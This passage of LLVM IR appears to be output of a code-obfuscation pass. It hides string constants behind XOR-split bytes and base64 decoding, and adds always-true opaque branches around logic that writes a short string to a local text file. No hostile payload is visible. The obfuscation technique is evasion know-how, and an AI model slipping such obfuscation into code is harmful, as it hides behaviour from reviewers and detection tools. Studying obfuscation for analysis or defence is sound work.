  %sp1.1.158 = bitcast [1 x i8]* %sp1.158 to i8*
  %i1.158 = load i8, i8* %sp1.1.158

  %xp158 = xor i8 %i0.158, %i1.158

  %fi.158 = alloca i8
  store i8 %xp158, i8* %fi.158

  %final.ptr.158 = bitcast i8* %fi.158 to [1 x i8]*
  %spi158 = load [1 x i8], [1 x i8]* %final.ptr.158
  store [1 x i8] %spi158, [1 x i8]* %sp3.62
;-------------------------------
  %next3.62 = getelementptr [5 x i8], [5 x i8]* %sp62, i32 0, i32 4
  
  %sp4.62 = bitcast i8* %next3.62 to [1 x i8]*
  store [1 x i8] c"\00", [1 x i8]* %sp4.62

  %spi62 = load [5 x i8], [5 x i8]* %sp62
  store [5 x i8] %spi62, [5 x i8]* %cipher.ptr.50
;-------------------------------
  %cipher.50 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.50, i32 0, i32 0
  %plain.ptr.50 = tail call i8* @base64_decode(i8* %cipher.50)
  %spi50 = ptrtoint i8* %plain.ptr.50 to i32
  store i32 %spi50, i32* %12, align 4
;-------------------------------
  store i32 %38, i32* %13, align 16
  store i32 134517829, i32* %14, align 4
  %arg.i.i12 = load i32, i32* %13, align 16
  %arg2.i.i13 = load i32, i32* %12, align 4
  %39 = tail call i32 @strcmp(i32 %arg.i.i12, i32 %arg2.i.i13)
  %.not.i35.i = icmp eq i32 %39, 0
  br i1 %.not.i35.i, label %BB_804944C.i, label %BB_8049453.i

BB_804944C.i:                                     ; preds = %BB_804942D.i
  store i32 134517841, i32* %7, align 4
  %tmp2_v.i7.i.i = add i32 %tmp0_v.i17.i, -40
  %40 = inttoptr i32 %tmp2_v.i7.i.i to i32*
  store i32 %tmp2_v4.i19.i, i32* %40, align 8
  store i32 134529024, i32* %12, align 4
  %tmp2_v2.i10.i.i = add i32 %tmp0_v.i17.i, -84
  %41 = inttoptr i32 %tmp2_v2.i10.i.i to i32*
  store i32 134517482, i32* %41, align 4
  %tmp4_v.i19.i.b.i = load i1, i1* @segs.0, align 1
  %42 = select i1 %tmp4_v.i19.i.b.i, i32* inttoptr (i32 add (i32 ptrtoint ([1024 x i8]* @_ZL6segmem to i32), i32 20) to i32*), i32* inttoptr (i32 20 to i32*)
  %43 = load i32, i32* %42, align 4
;-------------------------------
;--------Basic Condition--------
  %.not24.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not24.i.i, label %BB_24, label %next24
next24:
;-------------------------------
  store i32 %43, i32* %14, align 4
  %tmp2_v5.i.i.i16 = add i32 %tmp0_v.i17.i, -92
  %44 = inttoptr i32 %tmp2_v5.i.i.i16 to i32*
;-------------------------------
; Replace: store i32 134520866, i32* %44, align 4
  %cipher.ptr.51 = alloca [5 x i8]
;-------------------------------
; Replace: store [5 x i8] c"\64\79\73\41\00", [5 x i8]* %cipher.ptr.51
  %sp63 = alloca [5 x i8]

  
  %sp0.63 = bitcast [5 x i8]* %sp63 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\64", [1 x i8]* %sp0.63
  %sp0.159 = alloca [1 x i8]
  store [1 x i8] c"\03", [1 x i8]* %sp0.159
  %sp0.1.159 = bitcast [1 x i8]* %sp0.159 to i8*
  %i0.159 = load i8, i8* %sp0.1.159

  %sp1.159 = alloca [1 x i8]
  store [1 x i8] c"\67", [1 x i8]* %sp1.159
  %sp1.1.159 = bitcast [1 x i8]* %sp1.159 to i8*
  %i1.159 = load i8, i8* %sp1.1.159

  %xp159 = xor i8 %i0.159, %i1.159

  %fi.159 = alloca i8
  store i8 %xp159, i8* %fi.159

  %final.ptr.159 = bitcast i8* %fi.159 to [1 x i8]*
  %spi159 = load [1 x i8], [1 x i8]* %final.ptr.159
  store [1 x i8] %spi159, [1 x i8]* %sp0.63
;-------------------------------
  %next0.63 = getelementptr [5 x i8], [5 x i8]* %sp63, i32 0, i32 1
  
  %sp1.63 = bitcast i8* %next0.63 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\79", [1 x i8]* %sp1.63
  %sp0.160 = alloca [1 x i8]
  store [1 x i8] c"\2E", [1 x i8]* %sp0.160
  %sp0.1.160 = bitcast [1 x i8]* %sp0.160 to i8*
  %i0.160 = load i8, i8* %sp0.1.160

  %sp1.160 = alloca [1 x i8]
  store [1 x i8] c"\57", [1 x i8]* %sp1.160
  %sp1.1.160 = bitcast [1 x i8]* %sp1.160 to i8*
  %i1.160 = load i8, i8* %sp1.1.160

  %xp160 = xor i8 %i0.160, %i1.160

  %fi.160 = alloca i8
  store i8 %xp160, i8* %fi.160

  %final.ptr.160 = bitcast i8* %fi.160 to [1 x i8]*
  %spi160 = load [1 x i8], [1 x i8]* %final.ptr.160
  store [1 x i8] %spi160, [1 x i8]* %sp1.63
;-------------------------------
  %next1.63 = getelementptr [5 x i8], [5 x i8]* %sp63, i32 0, i32 2
  
  %sp2.63 = bitcast i8* %next1.63 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\73", [1 x i8]* %sp2.63
  %sp0.161 = alloca [1 x i8]
  store [1 x i8] c"\0B", [1 x i8]* %sp0.161
  %sp0.1.161 = bitcast [1 x i8]* %sp0.161 to i8*
  %i0.161 = load i8, i8* %sp0.1.161

  %sp1.161 = alloca [1 x i8]
  store [1 x i8] c"\78", [1 x i8]* %sp1.161
  %sp1.1.161 = bitcast [1 x i8]* %sp1.161 to i8*
  %i1.161 = load i8, i8* %sp1.1.161

  %xp161 = xor i8 %i0.161, %i1.161

  %fi.161 = alloca i8
  store i8 %xp161, i8* %fi.161

  %final.ptr.161 = bitcast i8* %fi.161 to [1 x i8]*
  %spi161 = load [1 x i8], [1 x i8]* %final.ptr.161
  store [1 x i8] %spi161, [1 x i8]* %sp2.63
;-------------------------------
  %next2.63 = getelementptr [5 x i8], [5 x i8]* %sp63, i32 0, i32 3
  
  %sp3.63 = bitcast i8* %next2.63 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp3.63
  %sp0.162 = alloca [1 x i8]
  store [1 x i8] c"\08", [1 x i8]* %sp0.162
  %sp0.1.162 = bitcast [1 x i8]* %sp0.162 to i8*
  %i0.162 = load i8, i8* %sp0.1.162

  %sp1.162 = alloca [1 x i8]
  store [1 x i8] c"\49", [1 x i8]* %sp1.162
  %sp1.1.162 = bitcast [1 x i8]* %sp1.162 to i8*
  %i1.162 = load i8, i8* %sp1.1.162

  %xp162 = xor i8 %i0.162, %i1.162

  %fi.162 = alloca i8
  store i8 %xp162, i8* %fi.162

  %final.ptr.162 = bitcast i8* %fi.162 to [1 x i8]*
  %spi162 = load [1 x i8], [1 x i8]* %final.ptr.162
  store [1 x i8] %spi162, [1 x i8]* %sp3.63
;-------------------------------
  %next3.63 = getelementptr [5 x i8], [5 x i8]* %sp63, i32 0, i32 4
  
  %sp4.63 = bitcast i8* %next3.63 to [1 x i8]*
  store [1 x i8] c"\00", [1 x i8]* %sp4.63

  %spi63 = load [5 x i8], [5 x i8]* %sp63
  store [5 x i8] %spi63, [5 x i8]* %cipher.ptr.51
;-------------------------------
  %cipher.51 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.51, i32 0, i32 0
  %plain.ptr.51 = tail call i8* @base64_decode(i8* %cipher.51)
  %spi51 = ptrtoint i8* %plain.ptr.51 to i32
  store i32 %spi51, i32* %44, align 4
;-------------------------------
  %tmp2_v7.i.i.i17 = add i32 %tmp0_v.i17.i, -96
  %45 = inttoptr i32 %tmp2_v7.i.i.i17 to i32*
;-------------------------------
; Replace: store i32 134520869, i32* %45, align 16
  %cipher.ptr.52 = alloca [21 x i8]
;-------------------------------
; Replace: store [21 x i8] c"\64\47\56\34\64\46\39\6d\61\57\78\6c\4d\79\35\30\65\48\51\41\00", [21 x i8]* %cipher.ptr.52
  %sp64 = alloca [21 x i8]

  
  %sp0.64 = bitcast [21 x i8]* %sp64 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\64\47", [2 x i8]* %sp0.64
  %sp0.163 = alloca [2 x i8]
  store [2 x i8] c"\2D\2C", [2 x i8]* %sp0.163
  %sp0.1.163 = bitcast [2 x i8]* %sp0.163 to i16*
  %i0.163 = load i16, i16* %sp0.1.163

  %sp1.163 = alloca [2 x i8]
  store [2 x i8] c"\49\6b", [2 x i8]* %sp1.163
  %sp1.1.163 = bitcast [2 x i8]* %sp1.163 to i16*
  %i1.163 = load i16, i16* %sp1.1.163

  %xp163 = xor i16 %i0.163, %i1.163

  %fi.163 = alloca i16
  store i16 %xp163, i16* %fi.163

  %final.ptr.163 = bitcast i16* %fi.163 to [2 x i8]*
  %spi163 = load [2 x i8], [2 x i8]* %final.ptr.163
  store [2 x i8] %spi163, [2 x i8]* %sp0.64
;-------------------------------
  %next0.64 = getelementptr [21 x i8], [21 x i8]* %sp64, i32 0, i32 2
  
  %sp1.64 = bitcast i8* %next0.64 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\56\34", [2 x i8]* %sp1.64
  %sp0.164 = alloca [2 x i8]
  store [2 x i8] c"\20\64", [2 x i8]* %sp0.164
  %sp0.1.164 = bitcast [2 x i8]* %sp0.164 to i16*
  %i0.164 = load i16, i16* %sp0.1.164

  %sp1.164 = alloca [2 x i8]
  store [2 x i8] c"\76\50", [2 x i8]* %sp1.164
  %sp1.1.164 = bitcast [2 x i8]* %sp1.164 to i16*
  %i1.164 = load i16, i16* %sp1.1.164

  %xp164 = xor i16 %i0.164, %i1.164

  %fi.164 = alloca i16
  store i16 %xp164, i16* %fi.164

  %final.ptr.164 = bitcast i16* %fi.164 to [2 x i8]*
  %spi164 = load [2 x i8], [2 x i8]* %final.ptr.164
  store [2 x i8] %spi164, [2 x i8]* %sp1.64
;-------------------------------
  %next1.64 = getelementptr [21 x i8], [21 x i8]* %sp64, i32 0, i32 4
  
  %sp2.64 = bitcast i8* %next1.64 to [3 x i8]*
;-------------------------------
; Replace: store [3 x i8] c"\64\46\39", [3 x i8]* %sp2.64
  %sp0.165 = alloca [3 x i8]
  store [3 x i8] c"\33\72\5E", [3 x i8]* %sp0.165
  %sp0.1.165 = bitcast [3 x i8]* %sp0.165 to i24*
  %i0.165 = load i24, i24* %sp0.1.165

  %sp1.165 = alloca [3 x i8]
  store [3 x i8] c"\57\34\67", [3 x i8]* %sp1.165
  %sp1.1.165 = bitcast [3 x i8]* %sp1.165 to i24*
  %i1.165 = load i24, i24* %sp1.1.165

  %xp165 = xor i24 %i0.165, %i1.165

  %fi.165 = alloca i24
  store i24 %xp165, i24* %fi.165

  %final.ptr.165 = bitcast i24* %fi.165 to [3 x i8]*
  %spi165 = load [3 x i8], [3 x i8]* %final.ptr.165
  store [3 x i8] %spi165, [3 x i8]* %sp2.64
;-------------------------------
  %next2.64 = getelementptr [21 x i8], [21 x i8]* %sp64, i32 0, i32 7
  
  %sp3.64 = bitcast i8* %next2.64 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6d\61", [2 x i8]* %sp3.64
  %sp0.166 = alloca [2 x i8]
  store [2 x i8] c"\59\50", [2 x i8]* %sp0.166
  %sp0.1.166 = bitcast [2 x i8]* %sp0.166 to i16*
  %i0.166 = load i16, i16* %sp0.1.166

  %sp1.166 = alloca [2 x i8]
  store [2 x i8] c"\34\31", [2 x i8]* %sp1.166
  %sp1.1.166 = bitcast [2 x i8]* %sp1.166 to i16*
  %i1.166 = load i16, i16* %sp1.1.166

  %xp166 = xor i16 %i0.166, %i1.166

  %fi.166 = alloca i16
  store i16 %xp166, i16* %fi.166

  %final.ptr.166 = bitcast i16* %fi.166 to [2 x i8]*
  %spi166 = load [2 x i8], [2 x i8]* %final.ptr.166
  store [2 x i8] %spi166, [2 x i8]* %sp3.64
;-------------------------------
  %next3.64 = getelementptr [21 x i8], [21 x i8]* %sp64, i32 0, i32 9
  
  %sp4.64 = bitcast i8* %next3.64 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\57\78", [2 x i8]* %sp4.64
  %sp0.167 = alloca [2 x i8]
  store [2 x i8] c"\64\4F", [2 x i8]* %sp0.167
  %sp0.1.167 = bitcast [2 x i8]* %sp0.167 to i16*
  %i0.167 = load i16, i16* %sp0.1.167

  %sp1.167 = alloca [2 x i8]
  store [2 x i8] c"\33\37", [2 x i8]* %sp1.167
  %sp1.1.167 = bitcast [2 x i8]* %sp1.167 to i16*
  %i1.167 = load i16, i16* %sp1.1.167

  %xp167 = xor i16 %i0.167, %i1.167

  %fi.167 = alloca i16
  store i16 %xp167, i16* %fi.167

  %final.ptr.167 = bitcast i16* %fi.167 to [2 x i8]*
  %spi167 = load [2 x i8], [2 x i8]* %final.ptr.167
  store [2 x i8] %spi167, [2 x i8]* %sp4.64
;-------------------------------
  %next4.64 = getelementptr [21 x i8], [21 x i8]* %sp64, i32 0, i32 11
  
  %sp5.64 = bitcast i8* %next4.64 to [3 x i8]*
;-------------------------------
; Replace: store [3 x i8] c"\6c\4d\79", [3 x i8]* %sp5.64
  %sp0.168 = alloca [3 x i8]
  store [3 x i8] c"\3A\24\28", [3 x i8]* %sp0.168
  %sp0.1.168 = bitcast [3 x i8]* %sp0.168 to i24*
  %i0.168 = load i24, i24* %sp0.1.168

  %sp1.168 = alloca [3 x i8]
  store [3 x i8] c"\56\69\51", [3 x i8]* %sp1.168
  %sp1.1.168 = bitcast [3 x i8]* %sp1.168 to i24*
  %i1.168 = load i24, i24* %sp1.1.168

  %xp168 = xor i24 %i0.168, %i1.168

  %fi.168 = alloca i24
  store i24 %xp168, i24* %fi.168

  %final.ptr.168 = bitcast i24* %fi.168 to [3 x i8]*
  %spi168 = load [3 x i8], [3 x i8]* %final.ptr.168
  store [3 x i8] %spi168, [3 x i8]* %sp5.64
;-------------------------------
  %next5.64 = getelementptr [21 x i8], [21 x i8]* %sp64, i32 0, i32 14
  
  %sp6.64 = bitcast i8* %next5.64 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\35\30", [2 x i8]* %sp6.64
  %sp0.169 = alloca [2 x i8]
  store [2 x i8] c"\43\5E", [2 x i8]* %sp0.169
  %sp0.1.169 = bitcast [2 x i8]* %sp0.169 to i16*
  %i0.169 = load i16, i16* %sp0.1.169

  %sp1.169 = alloca [2 x i8]
  store [2 x i8] c"\76\6e", [2 x i8]* %sp1.169
  %sp1.1.169 = bitcast [2 x i8]* %sp1.169 to i16*
  %i1.169 = load i16, i16* %sp1.1.169

  %xp169 = xor i16 %i0.169, %i1.169

  %fi.169 = alloca i16
  store i16 %xp169, i16* %fi.169

  %final.ptr.169 = bitcast i16* %fi.169 to [2 x i8]*
  %spi169 = load [2 x i8], [2 x i8]* %final.ptr.169
  store [2 x i8] %spi169, [2 x i8]* %sp6.64
;-------------------------------
  %next6.64 = getelementptr [21 x i8], [21 x i8]* %sp64, i32 0, i32 16
  
  %sp7.64 = bitcast i8* %next6.64 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\65\48", [2 x i8]* %sp7.64
  %sp0.170 = alloca [2 x i8]
  store [2 x i8] c"\3F\3F", [2 x i8]* %sp0.170
  %sp0.1.170 = bitcast [2 x i8]* %sp0.170 to i16*
  %i0.170 = load i16, i16* %sp0.1.170

  %sp1.170 = alloca [2 x i8]
  store [2 x i8] c"\5a\77", [2 x i8]* %sp1.170
  %sp1.1.170 = bitcast [2 x i8]* %sp1.170 to i16*
  %i1.170 = load i16, i16* %sp1.1.170

  %xp170 = xor i16 %i0.170, %i1.170

  %fi.170 = alloca i16
  store i16 %xp170, i16* %fi.170

  %final.ptr.170 = bitcast i16* %fi.170 to [2 x i8]*
  %spi170 = load [2 x i8], [2 x i8]* %final.ptr.170
  store [2 x i8] %spi170, [2 x i8]* %sp7.64
;-------------------------------
  %next7.64 = getelementptr [21 x i8], [21 x i8]* %sp64, i32 0, i32 18
  
  %sp8.64 = bitcast i8* %next7.64 to [3 x i8]*
;-------------------------------
; Replace: store [3 x i8] c"\51\41\00", [3 x i8]* %sp8.64
  %sp0.171 = alloca [3 x i8]
  store [3 x i8] c"\1B\34\68", [3 x i8]* %sp0.171
  %sp0.1.171 = bitcast [3 x i8]* %sp0.171 to i24*
  %i0.171 = load i24, i24* %sp0.1.171

  %sp1.171 = alloca [3 x i8]
  store [3 x i8] c"\4a\75\68", [3 x i8]* %sp1.171
  %sp1.1.171 = bitcast [3 x i8]* %sp1.171 to i24*
  %i1.171 = load i24, i24* %sp1.1.171

  %xp171 = xor i24 %i0.171, %i1.171

  %fi.171 = alloca i24
  store i24 %xp171, i24* %fi.171

  %final.ptr.171 = bitcast i24* %fi.171 to [3 x i8]*
  %spi171 = load [3 x i8], [3 x i8]* %final.ptr.171
  store [3 x i8] %spi171, [3 x i8]* %sp8.64
;-------------------------------

  %spi64 = load [21 x i8], [21 x i8]* %sp64
  store [21 x i8] %spi64, [21 x i8]* %cipher.ptr.52
;-------------------------------
  %cipher.52 = getelementptr inbounds [21 x i8], [21 x i8]* %cipher.ptr.52, i32 0, i32 0
  %plain.ptr.52 = tail call i8* @base64_decode(i8* %cipher.52)
  %spi52 = ptrtoint i8* %plain.ptr.52 to i32
  store i32 %spi52, i32* %45, align 16
;-------------------------------
  %tmp2_v8.i.i.i = add i32 %tmp0_v.i17.i, -100
  %46 = inttoptr i32 %tmp2_v8.i.i.i to i32*
  store i32 134517521, i32* %46, align 4
  %arg.i.i.i18 = load i32, i32* %45, align 16
  %arg2.i.i.i19 = load i32, i32* %44, align 4
  %47 = tail call i32 @fopen(i32 %arg.i.i.i18, i32 %arg2.i.i.i19)
  %tmp2_v.i41.i.i = add i32 %tmp0_v.i17.i, -76
  %48 = inttoptr i32 %tmp2_v.i41.i.i to i32*
  store i32 %47, i32* %48, align 4
  %tmp2_v.i28.i.i = add i32 %tmp0_v.i17.i, -72
  %49 = inttoptr i32 %tmp2_v.i28.i.i to i32*
  store i32 1818304585, i32* %49, align 8
  %tmp2_v1.i29.i.i = add i32 %tmp0_v.i17.i, -68
  %50 = inttoptr i32 %tmp2_v1.i29.i.i to i32*
  store i32 1701995892, i32* %50, align 4
  %tmp2_v2.i30.i.i = add i32 %tmp0_v.i17.i, -64
  %51 = inttoptr i32 %tmp2_v2.i30.i.i to i32*
  store i32 1752440932, i32* %51, align 16
  %tmp2_v3.i.i.i20 = add i32 %tmp0_v.i17.i, -60
  %52 = inttoptr i32 %tmp2_v3.i.i.i20 to i32*
  store i32 1768300645, i32* %52, align 4
;-------------------------------
;--------Basic Condition--------
  %.not20.i.i = icmp eq i32 0 , 0 ;always true
;-------------------------------
;--------Basic Condition--------
  %.not26.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not26.i.i, label %BB_26, label %next26
next26:
;-------------------------------
  br i1 %.not20.i.i, label %BB_20, label %next20
next20:
;-------------------------------
  %tmp2_v4.i31.i.i = add i32 %tmp0_v.i17.i, -56
  %53 = inttoptr i32 %tmp2_v4.i31.i.i to i32*
  store i32 2188652, i32* %53, align 8
  %54 = load i32, i32* %48, align 4
  store i32 %54, i32* %41, align 4
  %tmp2_v7.i36.i.i = add i32 %tmp0_v.i17.i, -88
;-------------------------------
;--------Basic Condition--------
  %.not4.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not4.i.i, label %BB_4, label %next4
next4:
;-------------------------------
  %55 = inttoptr i32 %tmp2_v7.i36.i.i to i32*
  store i32 20, i32* %55, align 8
  store i32 1, i32* %44, align 4
  store i32 %tmp2_v.i28.i.i, i32* %45, align 16
  store i32 134517622, i32* %46, align 4
  %arg.i.i4.i = load i32, i32* %45, align 16
  %arg2.i.i5.i = load i32, i32* %44, align 4
  %arg4.i.i.i21 = load i32, i32* %55, align 8
  %arg6.i.i.i = load i32, i32* %41, align 4
  %56 = tail call i32 @fwrite(i32 %arg.i.i4.i, i32 %arg2.i.i5.i, i32 %arg4.i.i.i21, i32 %arg6.i.i.i)
  %57 = load i32, i32* %48, align 4
  store i32 %57, i32* %45, align 16
  store i32 134517636, i32* %46, align 4
  %arg.i.i6.i = load i32, i32* %45, align 16
  %58 = tail call i32 @fclose(i32 %arg.i.i6.i)
  br label %.exit

.exit:                                            ; preds = %BB_804944C.i, %BB_8049426.i, %BB_8049453.i, %BB_8049472.i
  ret void
BB_2:
;-------------------------------
; Replace: %cast2= getelementptr [9 x i8], [9 x i8]* @.str1, i64 0, i64 0
  %cipher.ptr.28 = alloca [13 x i8]
;-------------------------------
; Replace: store [13 x i8] c"\65\6d\56\6d\61\63\53\31\61\48\51\41\00", [13 x i8]* %cipher.ptr.28
  %sp65 = alloca [13 x i8]

  
  %sp0.65 = bitcast [13 x i8]* %sp65 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\65", [1 x i8]* %sp0.65
  %sp0.172 = alloca [1 x i8]
  store [1 x i8] c"\07", [1 x i8]* %sp0.172
  %sp0.1.172 = bitcast [1 x i8]* %sp0.172 to i8*
  %i0.172 = load i8, i8* %sp0.1.172

  %sp1.172 = alloca [1 x i8]
  store [1 x i8] c"\62", [1 x i8]* %sp1.172
  %sp1.1.172 = bitcast [1 x i8]* %sp1.172 to i8*
  %i1.172 = load i8, i8* %sp1.1.172

  %xp172 = xor i8 %i0.172, %i1.172

  %fi.172 = alloca i8
  store i8 %xp172, i8* %fi.172

  %final.ptr.172 = bitcast i8* %fi.172 to [1 x i8]*
  %spi172 = load [1 x i8], [1 x i8]* %final.ptr.172
  store [1 x i8] %spi172, [1 x i8]* %sp0.65
;-------------------------------
  %next0.65 = getelementptr [13 x i8], [13 x i8]* %sp65, i32 0, i32 1
  
  %sp1.65 = bitcast i8* %next0.65 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\6d", [1 x i8]* %sp1.65
  %sp0.173 = alloca [1 x i8]
  store [1 x i8] c"\29", [1 x i8]* %sp0.173
  %sp0.1.173 = bitcast [1 x i8]* %sp0.173 to i8*
  %i0.173 = load i8, i8* %sp0.1.173

  %sp1.173 = alloca [1 x i8]
  store [1 x i8] c"\44", [1 x i8]* %sp1.173
  %sp1.1.173 = bitcast [1 x i8]* %sp1.173 to i8*
  %i1.173 = load i8, i8* %sp1.1.173

  %xp173 = xor i8 %i0.173, %i1.173

  %fi.173 = alloca i8
  store i8 %xp173, i8* %fi.173

  %final.ptr.173 = bitcast i8* %fi.173 to [1 x i8]*
  %spi173 = load [1 x i8], [1 x i8]* %final.ptr.173
  store [1 x i8] %spi173, [1 x i8]* %sp1.65
;-------------------------------
  %next1.65 = getelementptr [13 x i8], [13 x i8]* %sp65, i32 0, i32 2
  
  %sp2.65 = bitcast i8* %next1.65 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\56\6d", [2 x i8]* %sp2.65
  %sp0.174 = alloca [2 x i8]
  store [2 x i8] c"\1E\1A", [2 x i8]* %sp0.174
  %sp0.1.174 = bitcast [2 x i8]* %sp0.174 to i16*
  %i0.174 = load i16, i16* %sp0.1.174

  %sp1.174 = alloca [2 x i8]
  store [2 x i8] c"\48\77", [2 x i8]* %sp1.174
  %sp1.1.174 = bitcast [2 x i8]* %sp1.174 to i16*
  %i1.174 = load i16, i16* %sp1.1.174

  %xp174 = xor i16 %i0.174, %i1.174

  %fi.174 = alloca i16
  store i16 %xp174, i16* %fi.174

  %final.ptr.174 = bitcast i16* %fi.174 to [2 x i8]*
  %spi174 = load [2 x i8], [2 x i8]* %final.ptr.174
  store [2 x i8] %spi174, [2 x i8]* %sp2.65
;-------------------------------
  %next2.65 = getelementptr [13 x i8], [13 x i8]* %sp65, i32 0, i32 4
  
  %sp3.65 = bitcast i8* %next2.65 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\61", [1 x i8]* %sp3.65
  %sp0.175 = alloca [1 x i8]
  store [1 x i8] c"\52", [1 x i8]* %sp0.175
  %sp0.1.175 = bitcast [1 x i8]* %sp0.175 to i8*
  %i0.175 = load i8, i8* %sp0.1.175

  %sp1.175 = alloca [1 x i8]
  store [1 x i8] c"\33", [1 x i8]* %sp1.175
  %sp1.1.175 = bitcast [1 x i8]* %sp1.175 to i8*
  %i1.175 = load i8, i8* %sp1.1.175

  %xp175 = xor i8 %i0.175, %i1.175

  %fi.175 = alloca i8
  store i8 %xp175, i8* %fi.175

  %final.ptr.175 = bitcast i8* %fi.175 to [1 x i8]*
  %spi175 = load [1 x i8], [1 x i8]* %final.ptr.175
  store [1 x i8] %spi175, [1 x i8]* %sp3.65
;-------------------------------
  %next3.65 = getelementptr [13 x i8], [13 x i8]* %sp65, i32 0, i32 5
  
  %sp4.65 = bitcast i8* %next3.65 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\63\53", [2 x i8]* %sp4.65
  %sp0.176 = alloca [2 x i8]
  store [2 x i8] c"\2D\00", [2 x i8]* %sp0.176
  %sp0.1.176 = bitcast [2 x i8]* %sp0.176 to i16*
  %i0.176 = load i16, i16* %sp0.1.176

  %sp1.176 = alloca [2 x i8]
  store [2 x i8] c"\4e\53", [2 x i8]* %sp1.176
  %sp1.1.176 = bitcast [2 x i8]* %sp1.176 to i16*
  %i1.176 = load i16, i16* %sp1.1.176

  %xp176 = xor i16 %i0.176, %i1.176

  %fi.176 = alloca i16
  store i16 %xp176, i16* %fi.176

  %final.ptr.176 = bitcast i16* %fi.176 to [2 x i8]*
  %spi176 = load [2 x i8], [2 x i8]* %final.ptr.176
  store [2 x i8] %spi176, [2 x i8]* %sp4.65
;-------------------------------
  %next4.65 = getelementptr [13 x i8], [13 x i8]* %sp65, i32 0, i32 7
  
  %sp5.65 = bitcast i8* %next4.65 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\31", [1 x i8]* %sp5.65
  %sp0.177 = alloca [1 x i8]
  store [1 x i8] c"\43", [1 x i8]* %sp0.177
  %sp0.1.177 = bitcast [1 x i8]* %sp0.177 to i8*
  %i0.177 = load i8, i8* %sp0.1.177

  %sp1.177 = alloca [1 x i8]
  store [1 x i8] c"\72", [1 x i8]* %sp1.177
  %sp1.1.177 = bitcast [1 x i8]* %sp1.177 to i8*
  %i1.177 = load i8, i8* %sp1.1.177

  %xp177 = xor i8 %i0.177, %i1.177

  %fi.177 = alloca i8
  store i8 %xp177, i8* %fi.177

  %final.ptr.177 = bitcast i8* %fi.177 to [1 x i8]*
  %spi177 = load [1 x i8], [1 x i8]* %final.ptr.177
  store [1 x i8] %spi177, [1 x i8]* %sp5.65
;-------------------------------
  %next5.65 = getelementptr [13 x i8], [13 x i8]* %sp65, i32 0, i32 8
  
  %sp6.65 = bitcast i8* %next5.65 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\61\48", [2 x i8]* %sp6.65
  %sp0.178 = alloca [2 x i8]
  store [2 x i8] c"\55\22", [2 x i8]* %sp0.178
  %sp0.1.178 = bitcast [2 x i8]* %sp0.178 to i16*
  %i0.178 = load i16, i16* %sp0.1.178

  %sp1.178 = alloca [2 x i8]
  store [2 x i8] c"\34\6a", [2 x i8]* %sp1.178
  %sp1.1.178 = bitcast [2 x i8]* %sp1.178 to i16*
  %i1.178 = load i16, i16* %sp1.1.178

  %xp178 = xor i16 %i0.178, %i1.178

  %fi.178 = alloca i16
  store i16 %xp178, i16* %fi.178

  %final.ptr.178 = bitcast i16* %fi.178 to [2 x i8]*
  %spi178 = load [2 x i8], [2 x i8]* %final.ptr.178
  store [2 x i8] %spi178, [2 x i8]* %sp6.65
;-------------------------------
  %next6.65 = getelementptr [13 x i8], [13 x i8]* %sp65, i32 0, i32 10
  
  %sp7.65 = bitcast i8* %next6.65 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\51", [1 x i8]* %sp7.65
  %sp0.179 = alloca [1 x i8]
  store [1 x i8] c"\69", [1 x i8]* %sp0.179
  %sp0.1.179 = bitcast [1 x i8]* %sp0.179 to i8*
  %i0.179 = load i8, i8* %sp0.1.179

  %sp1.179 = alloca [1 x i8]
  store [1 x i8] c"\38", [1 x i8]* %sp1.179
  %sp1.1.179 = bitcast [1 x i8]* %sp1.179 to i8*
  %i1.179 = load i8, i8* %sp1.1.179

  %xp179 = xor i8 %i0.179, %i1.179

  %fi.179 = alloca i8
  store i8 %xp179, i8* %fi.179

  %final.ptr.179 = bitcast i8* %fi.179 to [1 x i8]*
  %spi179 = load [1 x i8], [1 x i8]* %final.ptr.179
  store [1 x i8] %spi179, [1 x i8]* %sp7.65
;-------------------------------
  %next7.65 = getelementptr [13 x i8], [13 x i8]* %sp65, i32 0, i32 11
  
  %sp8.65 = bitcast i8* %next7.65 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\00", [2 x i8]* %sp8.65
  %sp0.180 = alloca [2 x i8]
  store [2 x i8] c"\31\6D", [2 x i8]* %sp0.180
  %sp0.1.180 = bitcast [2 x i8]* %sp0.180 to i16*
  %i0.180 = load i16, i16* %sp0.1.180

  %sp1.180 = alloca [2 x i8]
  store [2 x i8] c"\70\6d", [2 x i8]* %sp1.180
  %sp1.1.180 = bitcast [2 x i8]* %sp1.180 to i16*
  %i1.180 = load i16, i16* %sp1.1.180

  %xp180 = xor i16 %i0.180, %i1.180

  %fi.180 = alloca i16
  store i16 %xp180, i16* %fi.180

  %final.ptr.180 = bitcast i16* %fi.180 to [2 x i8]*
  %spi180 = load [2 x i8], [2 x i8]* %final.ptr.180
  store [2 x i8] %spi180, [2 x i8]* %sp8.65
;-------------------------------

  %spi65 = load [13 x i8], [13 x i8]* %sp65
  store [13 x i8] %spi65, [13 x i8]* %cipher.ptr.28
;-------------------------------
  %cipher.28 = getelementptr inbounds [13 x i8], [13 x i8]* %cipher.ptr.28, i32 0, i32 0
  %plain.ptr.28 = tail call i8* @base64_decode(i8* %cipher.28)
  %spi28 = bitcast i8* %plain.ptr.28 to [9 x i8]*
